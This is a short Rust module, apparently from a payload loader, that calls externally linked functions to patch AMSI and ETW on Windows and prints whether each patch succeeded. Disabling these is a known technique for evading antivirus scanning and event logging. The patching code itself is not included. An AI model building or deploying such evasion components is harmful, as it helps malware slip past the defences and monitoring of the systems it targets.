#![allow(non_snake_case)]
use crate::user_struct::LoaderOptions;
#[link(name = ".\\out\\patcher", kind = "static")]

extern {
    fn patch_amsi()->i32;
    fn patch_etw()->i32;
}

pub fn patcher(options: &LoaderOptions) {
    // Check for AMSI Patching
    if options.patch_amsi {
        println!("[i] Attempting to Patch AMSI");
        let ret: i32 = unsafe {
            patch_amsi()
        };
        if ret <0 {
            eprintln!("[!] Failed to patch AMSI");
        }
        else {
            println!("[i] Successfully patched AMSI\n");
        }
    }
    if options.patch_etw {
        println!("[i] Attempting to Patch ETW");

        let ret: i32 = unsafe {
            patch_etw()
        };
        if ret <0 {
            eprintln!("[!] Failed to patch ETW");
        }
        else {
            println!("[i] Successfully patched ETW\n");
        }
    }
}